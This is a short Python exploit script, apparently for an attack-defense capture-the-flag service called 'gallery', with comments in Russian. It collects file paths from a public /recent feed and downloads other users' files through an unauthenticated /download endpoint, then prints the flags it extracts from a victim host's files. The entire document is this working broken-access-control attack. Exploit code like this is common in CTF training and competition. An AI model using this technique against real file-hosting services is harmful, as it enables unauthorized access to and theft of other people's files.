#!/usr/bin/env python3
"""gallery — path traversal / broken access control. Публичная лента /recent
раскрывает пути "<token16>/<name>", а /download?path= отдаёт файл без
авторизации и проверки владельца. Берём пути из ленты и качаем чужие файлы.
Запуск: gallery.py <ip_жертвы> [порт]  (флаги построчно в stdout)."""
import os
import re
import sys

import requests

FLAG = re.compile(os.environ.get("FLAG_FORMAT", r"[A-Z0-9]{31}="))
HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else int(os.environ.get("PORT", "5005"))
BASE = f"http://{HOST}:{PORT}"

flags = set()
try:
    items = requests.get(f"{BASE}/recent", timeout=4).json().get("items", [])
except (requests.RequestException, ValueError):
    items = []

for it in items:
    p = (it or {}).get("path")
    if not p:
        continue
    try:
        content = requests.get(f"{BASE}/download", params={"path": p}, timeout=4) \
            .json().get("content", "") or ""
    except (requests.RequestException, ValueError):
        continue
    flags.update(FLAG.findall(content))

for f in sorted(flags):
    print(f)
